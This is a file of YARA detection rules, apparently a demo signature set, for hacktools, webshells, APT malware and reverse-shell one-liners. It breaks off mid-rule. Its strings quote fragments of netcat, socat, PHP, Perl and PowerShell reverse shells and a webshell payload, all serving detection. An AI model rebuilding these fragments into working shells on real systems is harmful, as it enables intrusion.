$op3 = { 90 d5 0c 43 00 34 0d 43 00 ea 0c 43 00 7e 0d 43 00 b6 0d 43 00 cc }
$op4 = { 69 c0 ff 00 00 00 8b 4d c0 23 88 40 7c 49 00 89 4d c0 8b 45 cc 0b 45 c0 89 45 cc 8b 45 d0 }
condition:
( uint16 ( 0 ) == 0x5a4d or uint32be ( 0 ) == 0x7f454c46 ) and filesize < 2000KB and ( 1 of ( $x* ) or 2 of ( $sx* ) or all of ( $sa* ) or 3 of ( $op* ) ) or ( filesize < 10MB and 1 of ( $xe* ) ) or 5 of them
}
rule SSC_APT_APT29_NOBELIUM_BoomBox_PDF_Masq_May21_1_RID3517 : APT DEMO G0016 G0118 RUSSIA {
meta:
description = "Detects PDF documents as used by BoomBox as described in APT29 NOBELIUM report"
author = "Florian Roth"
reference = "https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/"
date = "2021-05-27 15:58:21"
score = 70
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "APT, DEMO, G0016, G0118, RUSSIA"
required_modules = "math"
minimum_yara = "3.3.0"
strings:
$ah1 = { 25 50 44 46 2d 31 2e 33 0a 25 }
$af1 = { 0a 25 25 45 4f 46 0a }
$fp1 = "endobj" ascii
$fp2 = "endstream" ascii
$fp3 = { 20 6F 62 6A 0A }
condition:
$ah1 at 0 and $af1 at ( filesize - 7 ) and filesize < 100KB and math.entropy ( 16 , filesize ) > 7 and not 1 of ( $fp* )
}
rule SSC_HKTL_Nishang_PS1_Invoke_PowerShellTcpOneLine_RID379E : DEMO HKTL SCRIPT T1059_001 T1086 {
meta:
description = "Detects PowerShell Oneliner in Nishang's repository"
author = "Florian Roth"
reference = "https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1"
date = "2021-03-03 17:46:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "2f4c948974da341412ab742e14d8cdd33c1efa22b90135fcfae891f08494ac32"
tags = "DEMO, HKTL, SCRIPT, T1059_001, T1086"
minimum_yara = "1.7"
strings:
$s1 = "=([text.encoding]::ASCII).GetBytes((iex $" ascii wide
$s2 = ".GetStream();[byte[]]$" ascii wide
$s3 = "New-Object Net.Sockets.TCPClient('" ascii wide
condition:
all of them
}
rule SSC_HKTL_PS1_PowerCat_Mar21_RID2EDD : DEMO HKTL SCRIPT T1059_001 T1086 {
meta:
description = "Detects PowerCat hacktool"
author = "Florian Roth"
reference = "https://github.com/besimorhino/powercat"
date = "2021-03-02 11:32:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2"
tags = "DEMO, HKTL, SCRIPT, T1059_001, T1086"
minimum_yara = "1.7"
strings:
$x1 = "powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com" ascii fullword
$x2 = "try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}" ascii fullword
$s1 = "Returning Encoded Payload..." ascii
$s2 = "$CommandToExecute =" ascii fullword
$s3 = "[alias(\"Execute\")][string]$e=\"\"," ascii
condition:
uint16 ( 0 ) == 0x7566 and filesize < 200KB and 1 of ( $x* ) or 3 of them
}
rule SSC_HKTL_Mimikatz_SkeletonKey_in_memory_Aug20_1_RID3752 : DEMO HKTL S0002 T1003 T1075 T1097 T1098 T1177 T1178 {
meta:
description = "Detects Mimikatz SkeletonKey in Memory"
author = "Florian Roth"
reference = "https://twitter.com/sbousseaden/status/1292143504131600384?s=12"
date = "2020-08-09 17:33:31"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, S0002, T1003, T1075, T1097, T1098, T1177, T1178"
minimum_yara = "1.7"
strings:
$x1 = { 60 ba 4f ca c7 44 24 34 dc 46 6c 7a c7 44 24 38
03 3c 17 81 c7 44 24 3c 94 c0 3d f6 }
condition:
1 of them
}
rule SSC_HKTL_FRP_Apr20_1_RID2BFF : DEMO HKTL T1090 {
meta:
description = "Detects FRP fast reverse proxy tool often used by threat groups"
author = "Florian Roth"
reference = "https://github.com/fatedier/frp"
date = "2020-04-07 09:30:21"
score = 70
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
modified = "2022-11-03"
hash1 = "05537c1c4e29db76a24320fb7cb80b189860389cdb16a9dbeb0c8d30d9b37006"
hash2 = "08c685c8febb5385f7548c2a64a27bae7123a937c5af958ebc08a3accb29978d"
tags = "DEMO, HKTL, T1090"
minimum_yara = "1.7"
strings:
$x1 = "frp/vendor/github.com/spf13/" ascii
$x2 = "github.com/fatedier/frp/vendor/" ascii
$fpg2 = "<html"
$fpg3 = "<HTML"
$fpg6 = "<?xml"
condition:
1 of ( $x* ) and not 1 of ( $fp* )
}
rule SSC_HKTL_FRP_INI_Apr20_1_RID2D3E : DEMO FILE HKTL T1090 {
meta:
description = "Detects FRP fast reverse proxy tool INI file often used by threat groups"
author = "Florian Roth"
reference = "Chinese Hacktools OpenDir"
date = "2020-04-07 10:23:31"
score = 60
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "1dabef3c170e4e559c50d603d47fb7f66f6e3da75a65c3435b18175d6e9785bb"
tags = "DEMO, FILE, HKTL, T1090"
minimum_yara = "1.7"
strings:
$h1 = "[common]" ascii
$s1 = "server_addr =" ascii fullword
$s2 = "remote_port =" ascii fullword
$s3 = "[RemoteDesktop]" ascii fullword
$s4 = "local_ip = " ascii
$s5 = "type = tcp" ascii fullword
condition:
uint16 ( 0 ) == 0x635b and filesize < 1KB and $h1 at 0 and all of them
}
rule SSC_HKTL_CN_ProcHook_May19_1_RID2F38 : CHINA DEMO EXE FILE HKTL {
meta:
description = "Detects hacktool used by Chinese threat groups"
author = "Florian Roth"
reference = "https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/"
date = "2019-05-31 11:47:51"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "02ebdc1ff6075c15a44711ccd88be9d6d1b47607fea17bef7e5e17f8da35293e"
tags = "CHINA, DEMO, EXE, FILE, HKTL"
required_modules = "pe"
minimum_yara = "3.2.0"
condition:
uint16 ( 0 ) == 0x5a4d and filesize < 300KB and pe.imphash ( ) == "343d580dd50ee724746a5c28f752b709"
}
rule SSC_HKTL_LNX_Pnscan_RID2C57 : DEMO HKTL LINUX T1046 {
meta:
description = "Detects Pnscan port scanner"
author = "Florian Roth"
reference = "https://github.com/ptrrkssn/pnscan"
date = "2019-05-27 09:45:01"
score = 55
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, LINUX, T1046"
minimum_yara = "1.7"
strings:
$x1 = "-R<hex list>   Hex coded response string to look for." fullword ascii
$x2 = "This program implements a multithreaded TCP port scanner." ascii wide
condition:
filesize < 6000KB and 1 of them
}
rule SSC_eicar_av_test3 {
meta:
description = "This is a standard AV test, intended to verify that BinaryAlert is working correctly."
author = "Austin Byers | Airbnb CSIRT"
reference = "http://www.eicar.org/86-0-Intended-use.html"
strings:
$eicar_regex = /^X5O!P%@AP\[4\\PZX54\(P\^\)7CC\)7\}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H\+H\*\s*$/
condition:
all of them
}
rule SSC_HKTL_Keyword_InjectDLL_RID2F20 : DEMO EXE FILE HKTL {
meta:
description = "Detects suspicious InjectDLL keyword found in hacktools or possibly unwanted applications"
author = "Florian Roth"
reference = "https://github.com/zerosum0x0/koadic"
date = "2019-04-04 11:43:51"
score = 60
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "2e7b4141e1872857904a0ef2d87535fd913cbdd9f964421f521b5a228a492a29"
tags = "DEMO, EXE, FILE, HKTL"
minimum_yara = "1.7"
strings:
$s2 = "InjectDLL" fullword ascii
$s4 = "Kernel32.dll" fullword ascii
condition:
uint16 ( 0 ) == 0x5a4d and all of them
}
rule SSC_Eicar_AV_TEST_2 {
strings:
$txt1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
condition:
all of them
}
rule SSC_Eicar_AV_TEST_3 {
strings:
$txt1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
condition:
all of them
}
rule SSC_Eicar_AV_TEST_4 {
strings:
$txt1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
condition:
all of them
}
rule SSC_Eicar_AV_TEST_5 {
strings:
$txt1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
condition:
all of them
}
rule SSC_Eicar_AV_TEST_6 {
strings:
$txt1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
condition:
all of them
}
rule SSC_Eicar_AV_TEST_7 {
strings:
$txt1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
condition:
all of them
}
rule SSC_Eicar_AV_TEST_8 {
strings:
$txt1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
condition:
all of them
}
rule SSC_Eicar_AV_TEST_9 {
strings:
$txt1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
condition:
all of them
}
rule SSC_Eicar_AV_TEST_10 {
strings:
$txt1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
condition:
all of them
}
rule SSC_Eicar_AV_TEST_11 {
strings:
$txt1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
condition:
all of them
}
rule SSC_Eicar_AV_TEST_12 {
strings:
$txt1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
condition:
all of them
}
rule SSC_Eicar_AV_TEST_13 {
strings:
$txt1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
condition:
all of them
}
rule SSC_HKTL_Dsniff_RID2AFD : APT DEMO HKTL {
meta:
description = "Detects Dsniff hack tool"
author = "Florian Roth"
reference = "https://goo.gl/eFoP4A"
date = "2019-02-19 08:47:21"
score = 55
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "APT, DEMO, HKTL"
minimum_yara = "1.7"
strings:
$x1 = ".*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*"
condition:
1 of them
}
rule SSC_HKTL_PowerKatz_Feb19_1_RID2EB0 : DEMO HKTL {
meta:
description = "Detetcs a tool used in the Australian Parliament House network compromise"
author = "Florian Roth"
reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
date = "2019-02-18 11:25:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$x1 = "Powerkatz32" ascii wide fullword
$x2 = "Powerkatz64" ascii wide
$s1 = "GetData: not found taskName" fullword ascii wide
$s2 = "GetRes Ex:" fullword ascii wide
condition:
1 of ( $x* ) and 1 of ( $s* )
}
rule SSC_HKTL_Unknown_Feb19_1_RID2DF9 : DEMO HKTL {
meta:
description = "Detetcs a tool used in the Australian Parliament House network compromise"
author = "Florian Roth"
reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
date = "2019-02-18 10:54:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$x1 = "not a valid timeout format!" ascii wide fullword
$x2 = "host can not be empty!" ascii wide fullword
$x3 = "not a valid port format!" ascii wide fullword
$x4 = "{0} - {1} TTL={2} time={3}" ascii wide fullword
$x5 = "ping count is not a correct format!" ascii wide fullword
$s1 = "The result is too large,program store to '{0}'.Please download it manully." fullword ascii wide
$s2 = "C:\\Windows\\temp\\" ascii wide
condition:
1 of ( $x* ) or 2 of them
}
rule SSC_HKTL_NoPowerShell_RID2D65 : DEMO HKTL {
meta:
description = "Detects NoPowerShell hack tool"
author = "Florian Roth"
reference = "https://github.com/bitsadmin/nopowershell"
date = "2018-12-28 10:30:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "2dad091dd00625762a7590ce16c3492cbaeb756ad0e31352a42751deb7cf9e70"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$x1 = "\\NoPowerShell.pdb" ascii
$x2 = "Invoke-WmiMethod -Class Win32_Process -Name Create \"cmd" fullword wide
$x3 = "ls C:\\Windows\\System32 -Include *.exe | select -First 10 Name,Length" fullword wide
$x4 = "ls -Recurse -Force C:\\Users\\ -Include *.kdbx" fullword wide
$x5 = "NoPowerShell.exe" fullword wide
condition:
1 of them
}
rule SSC_HKTL_SqlMap_RID2AF1 : DEMO HKTL {
meta:
description = "Detects sqlmap hacktool"
author = "Florian Roth"
reference = "https://github.com/sqlmapproject/sqlmap"
date = "2018-10-09 09:33:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "9444478b03caf7af853a64696dd70083bfe67f76aa08a16a151c00aadb540fa8"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$x1 = "if cmdLineOptions.get(\"sqlmapShell\"):" fullword ascii
$x2 = "if conf.get(\"dumper\"):" fullword ascii
condition:
filesize < 50KB and 1 of them
}
rule SSC_HKTL_SqlMap_backdoor_RID2E95 : DEMO FILE HKTL MAL SUSP {
meta:
description = "Detects SqlMap backdoors"
author = "Florian Roth"
reference = "https://github.com/sqlmapproject/sqlmap"
date = "2018-10-09 11:20:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, FILE, HKTL, MAL, SUSP"
minimum_yara = "1.7"
condition:
( uint32 ( 0 ) == 0x8e859c07 or uint32 ( 0 ) == 0x2d859c07 or uint32 ( 0 ) == 0x92959c07 or uint32 ( 0 ) == 0x929d9c07 or uint32 ( 0 ) == 0x29959c07 or uint32 ( 0 ) == 0x2b8d9c07 or uint32 ( 0 ) == 0x2b859c07 or uint32 ( 0 ) == 0x28b59c07 ) and filesize < 2KB
}
rule SSC_HKTL_beRootexe_output_RID2F60 : DEMO HKTL {
meta:
description = "Detects the output of beRoot.exe"
author = "Tobias Michalski"
reference = "https://github.com/AlessandroZ/BeRoot/tree/master/Windows"
date = "2018-07-25 11:54:31"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s1 = "permissions: {'change_config'" fullword wide
$s2 = "Full path: C:\\Windows\\system32\\msiexec.exe /V" fullword wide
$s3 = "Full path: C:\\Windows\\system32\\svchost.exe -k DevicesFlow" fullword wide
$s4 = "! BANG BANG !" fullword wide
condition:
filesize < 400KB and 3 of them
}
rule SSC_HKTL_EmbeddedPDF_RID2C87 : DEMO FILE HKTL MAL {
meta:
description = "Detects Embedded PDFs which can start malicious content"
author = "Tobias Michalski"
reference = "https://twitter.com/infosecn1nja/status/1021399595899731968?s=12"
date = "2018-07-25 09:53:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, FILE, HKTL, MAL"
minimum_yara = "1.7"
strings:
$x1 = "/Type /Action\n /S /JavaScript\n /JS (this.exportDataObject({" fullword ascii
$s1 = "(This PDF document embeds file" fullword ascii
$s2 = "/Names << /EmbeddedFiles << /Names" fullword ascii
$s3 = "/Type /EmbeddedFile" fullword ascii
condition:
uint16 ( 0 ) == 0x5025 and 2 of ( $s* ) and $x1
}
rule SSC_MAL_ELF_VPNFilter_1_RID2D6A : APT DEMO FILE LINUX MAL {
meta:
description = "Detects VPNFilter malware"
author = "Florian Roth"
reference = "Internal Research"
date = "2018-05-24 10:30:51"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "f8286e29faa67ec765ae0244862f6b7914fcdde10423f96595cb84ad5cc6b344"
tags = "APT, DEMO, FILE, LINUX, MAL"
minimum_yara = "1.7"
strings:
$s1 = "Login=" fullword ascii
$s2 = "Password=" fullword ascii
$s3 = "%s/rep_%u.bin" fullword ascii
$s4 = "%s:%uh->%s:%hu" fullword ascii
$s5 = "Password required" fullword ascii
$s6 = "password=" fullword ascii
$s7 = "Authorization: Basic" fullword ascii
$s8 = "/tmUnblock.cgi" fullword ascii
condition:
uint16 ( 0 ) == 0x457f and filesize < 100KB and all of them
}
rule SSC_MAL_ELF_VPNFilter_2_RID2D6B : APT DEMO FILE LINUX MAL {
meta:
description = "Detects VPNFilter malware"
author = "Florian Roth"
reference = "Internal Research"
date = "2018-05-24 10:31:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "50ac4fcd3fbc8abcaa766449841b3a0a684b3e217fc40935f1ac22c34c58a9ec"
tags = "APT, DEMO, FILE, LINUX, MAL"
minimum_yara = "1.7"
strings:
$s1 = "User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0)" fullword ascii
$s2 = "passwordPASSWORDpassword" fullword ascii
$s3 = "/tmp/client.key" fullword ascii
condition:
uint16 ( 0 ) == 0x457f and filesize < 1000KB and all of them
}
rule SSC_MAL_ELF_VPNFilter_3_RID2D6C : APT DEMO FILE LINUX MAL {
meta:
description = "Detects VPNFilter malware"
author = "Florian Roth"
reference = "Internal Research"
date = "2018-05-24 10:31:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "0e0094d9bd396a6594da8e21911a3982cd737b445f591581560d766755097d92"
hash2 = "9683b04123d7e9fe4c8c26c69b09c2233f7e1440f828837422ce330040782d17"
hash3 = "37e29b0ea7a9b97597385a12f525e13c3a7d02ba4161a6946f2a7d978cc045b4"
tags = "APT, DEMO, FILE, LINUX, MAL"
minimum_yara = "1.7"
strings:
$sx1 = "User-Agent: Mozilla/6.1 (compatible; MSIE 9.0; Windows NT 5.3; Trident/5.0)" fullword ascii
$sx2 = "Execute by shell[%d]:" fullword ascii
$sx3 = "CONFIG.TOR.name:" fullword ascii
$s1 = "Executing command:  %s %s..." fullword ascii
$s2 = "/proc/%d/cmdline" fullword ascii
$a1 = "Mozilla/5.0 Firefox/50.0" fullword ascii
$a2 = "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0" fullword ascii
$a3 = "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0" fullword ascii
condition:
uint16 ( 0 ) == 0x457f and filesize < 1000KB and ( 1 of ( $sx* ) or 2 of ( $s* ) or 2 of ( $a* ) )
}
rule SSC_HKTL_shellpop_TCLsh_RID2E27 : DEMO HKTL {
meta:
description = "Detects suspicious TCLsh popshell"
author = "Tobias Michalski"
reference = "https://github.com/0x00-0x00/ShellPop"
date = "2018-05-18 11:02:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "9f49d76d70d14bbe639a3c16763d3b4bee92c622ecb1c351cb4ea4371561e133"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s1 = "{ puts -nonewline $s \"shell>\";flush $s;gets $s c;set e \"exec $c\";if" ascii
condition:
filesize < 1KB and 1 of them
}
rule SSC_HKTL_shellpop_ruby_RID2E2B : DEMO HKTL {
meta:
description = "Detects suspicious ruby shellpop"
author = "Tobias Michalski"
reference = "https://github.com/0x00-0x00/ShellPop"
date = "2018-05-18 11:03:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "6b425b37f3520fd8c778928cc160134a293db0ce6d691e56a27894354b04f783"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$x1 = ");while(cmd=c.gets);IO.popen(cmd,'r'){" ascii
condition:
filesize < 1KB and all of them
}
rule SSC_HKTL_shellpop_awk_RID2DAC : DEMO HKTL {
meta:
description = "Detects suspicious AWK Shellpop"
author = "Tobias Michalski"
reference = "https://github.com/0x00-0x00/ShellPop"
date = "2018-05-18 10:41:51"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "7513a0a0ba786b0e22a9a7413491b4011f60af11253c596fa6857fb92a6736fc"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s1 = "awk 'BEGIN {s = \"/inet/tcp/0/" ascii
$s2 = "; while(42) " ascii
condition:
filesize < 1KB and 1 of them
}
rule SSC_HKTL_shellpop_socat_RID2E83 : DEMO HKTL {
meta:
description = "Detects suspicious socat popshell"
author = "Tobias Michalski"
reference = "https://github.com/0x00-0x00/ShellPop"
date = "2018-05-18 11:17:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "267f69858a5490efb236628260b275ad4bbfeebf4a83fab8776e333ca706a6a0"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s1 = "socat tcp-connect" ascii
$s2 = ",pty,stderr,setsid,sigint,sane" ascii
condition:
filesize < 1KB and 2 of them
}
rule SSC_HKTL_shellpop_Netcat_UDP_RID3010 : DEMO HKTL {
meta:
description = "Detects suspicious netcat popshell"
author = "Tobias Michalski"
reference = "https://github.com/0x00-0x00/ShellPop"
date = "2018-05-18 12:23:51"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "d823ad91b315c25893ce8627af285bcf4e161f9bbf7c070ee2565545084e88be"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s1 = "mkfifo fifo ; nc.traditional -u" ascii
$s2 = "< fifo | { bash -i; } > fifo" fullword ascii
condition:
filesize < 1KB and 1 of them
}
rule SSC_HKTL_shellpop_Perl_RID2DFC : DEMO HKTL SCRIPT {
meta:
description = "Detects Shellpop Perl script"
author = "Tobias Michalski"
reference = "https://github.com/0x00-0x00/ShellPop"
date = "2018-05-18 10:55:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "32c3e287969398a070adaad9b819ee9228174c9cb318d230331d33cda51314eb"
tags = "DEMO, HKTL, SCRIPT"
minimum_yara = "1.7"
strings:
$ = "perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);" ascii
$ = ";STDIN->fdopen(\\$c,r);$~->fdopen(\\$c,w);s" ascii
condition:
filesize < 2KB and 1 of them
}
rule SSC_HKTL_shellpop_Python_RID2EEB : DEMO HKTL MAL SCRIPT T1059_006 T1146 {
meta:
description = "Detects malicious python shell"
author = "Tobias Michalski"
reference = "https://github.com/0x00-0x00/ShellPop"
date = "2018-05-18 11:35:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "aee1c9e45a1edb5e462522e266256f68313e2ff5956a55f0a84f33bc6baa980b"
tags = "DEMO, HKTL, MAL, SCRIPT, T1059_006, T1146"
minimum_yara = "1.7"
strings:
$ = "os.putenv('HISTFILE', '/dev/null');" ascii
condition:
filesize < 2KB and 1 of them
}
rule SSC_HKTL_shellpop_PHP_TCP_RID2E97 : DEMO HKTL MAL SCRIPT T1100 {
meta:
description = "Detects malicious PHP shell"
author = "Tobias Michalski"
reference = "https://github.com/0x00-0x00/ShellPop"
date = "2018-05-18 11:21:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "0412e1ab9c672abecb3979a401f67d35a4a830c65f34bdee3f87e87d060f0290"
tags = "DEMO, HKTL, MAL, SCRIPT, T1100"
minimum_yara = "1.7"
strings:
$x1 = "php -r \"\\$sock=fsockopen" ascii
$x2 = ";exec('/bin/sh -i <&3 >&3 2>&3');\"" ascii
condition:
filesize < 3KB and all of them
}
rule SSC_HKTL_shellpop_Powershell_TCP_RID31D4 : DEMO HKTL MAL SCRIPT T1059_001 T1086 {
meta:
description = "Detects malicious powershell"
author = "Tobias Michalski"
reference = "https://github.com/0x00-0x00/ShellPop"
date = "2018-05-18 13:39:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "8328806700696ffe8cc37a0b81a67a6e9c86bb416364805b8aceaee5db17333f"
tags = "DEMO, HKTL, MAL, SCRIPT, T1059_001, T1086"
minimum_yara = "1.7"
strings:
$ = "Something went wrong with execution of command on the target" ascii
$ = ";[byte[]]$bytes = 0..65535|%{0};$sendbytes =" ascii
condition:
filesize < 3KB and 1 of them
}
rule SSC_HKTL_shellpop_Telnet_TCP_RID301B : DEMO HKTL MAL SCRIPT {
meta:
description = "Detects malicious telnet shell"
author = "Tobias Michalski"
reference = "https://github.com/0x00-0x00/ShellPop"
date = "2018-05-18 12:25:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "cf5232bae0364606361adafab32f19cf56764a9d3aef94890dda9f7fcd684a0e"
tags = "DEMO, HKTL, MAL, SCRIPT"
minimum_yara = "1.7"
strings:
$x1 = "if [ -e /tmp/f ]; then rm /tmp/f;" ascii
$x2 = "0</tmp/f|/bin/bash 1>/tmp/f" fullword ascii
condition:
filesize < 3KB and 1 of them
}
rule SSC_HKTL_shellpop_netcat_RID2EE8 : DEMO HKTL {
meta:
description = "Detects suspcious netcat shellpop"
author = "Tobias Michalski"
reference = "https://github.com/0x00-0x00/ShellPop"
date = "2018-05-18 11:34:31"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "98e3324f4c096bb1e5533114249a9e5c43c7913afa3070488b16d5b209e015ee"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s1 = "if [ -e /tmp/f ]; then rm /tmp/f;" ascii
$s2 = "fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc" ascii
$s4 = "mknod /tmp/f p && nc" ascii
$s5 = "</tmp/f|/bin/bash 1>/tmp/f" ascii
condition:
filesize < 2KB and 1 of them
}
rule SSC_Phish_Trojan_RID2E2F : DEMO EXE FILE MAL T1193 T1203 {
meta:
description = "Detects a trojan used in Aramco Phishing"
author = "Florian Roth"
reference = "https://goo.gl/Z3JUAA"
date = "2017-10-12 11:03:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "8ad94dc5d59aa1e9962c76fd5ca042e582566049a97aef9f5730ba779e5ebb91"
tags = "DEMO, EXE, FILE, MAL, T1193, T1203"
minimum_yara = "1.7"
strings:
$s1 = { 7B 00 30 00 7D 00 7B 00 31 00 7D 00 5C 00 00 09
2E 00 64 00 6C 00 6C 00 00 11 77 00 33 00 77 00
70 00 2E 00 65 00 78 00 65 00 00 1B 61 00 73 00
70 00 6E 00 65 00 74 00 5F 00 77 00 70 00 2E 00
65 00 78 00 65 }
condition:
( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them )
}
rule SSC_HKTL_Empire_PowerUp_RID2E36 : DEMO HKTL SCRIPT T1059_001 T1064 T1086 {
meta:
description = "Detects Empire component - file PowerUp.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05 11:04:51"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "ad9a5dff257828ba5f15331d59dd4def3989537b3b6375495d0c08394460268c"
tags = "DEMO, HKTL, SCRIPT, T1059_001, T1064, T1086"
minimum_yara = "1.7"
strings:
$x2 = "$PoolPasswordCmd = 'c:\\windows\\system32\\inetsrv\\appcmd.exe list apppool" fullword ascii
condition:
( uint16 ( 0 ) == 0x233c and filesize < 2000KB and 1 of them ) or all of them
}
rule SSC_WebShell_PHP_Web_Kit_v3_RID2F7A : DEMO FILE T1100 WEBSHELL {
meta:
description = "Detects PAS Tool PHP Web Kit"
author = "Florian Roth"
reference = "https://github.com/wordfence/grizzly"
date = "2016-01-01 11:58:51"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, FILE, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$php = "<?php $"
$php2 = "@assert(base64_decode($_REQUEST["
$s1 = "(str_replace(\"\\n\", '', '"
$s2 = "(strrev($" ascii
$s3 = "de'.'code';" ascii
condition:
( ( uint32 ( 0 ) == 0x68703f3c and $php at 0 ) or $php2 ) and filesize > 8KB and filesize < 100KB and all of ( $s* )
}
rule SSC_Sofacy_Malware_AZZY_Backdoor_1_RID325F : APT DEMO EXE FILE G0007 MAL RUSSIA {
meta:
